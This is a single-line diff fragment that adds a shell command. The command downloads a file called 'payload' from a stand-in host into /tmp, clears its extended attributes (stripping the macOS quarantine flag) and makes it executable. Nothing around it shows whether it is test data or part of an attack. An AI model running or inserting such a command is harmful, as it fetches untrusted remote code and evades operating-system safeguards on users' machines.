@@ -1,0 +1,1 @@
+curl -o /tmp/payload https://example.invalid/p; xattr -c /tmp/payload; chmod +x /tmp/payload
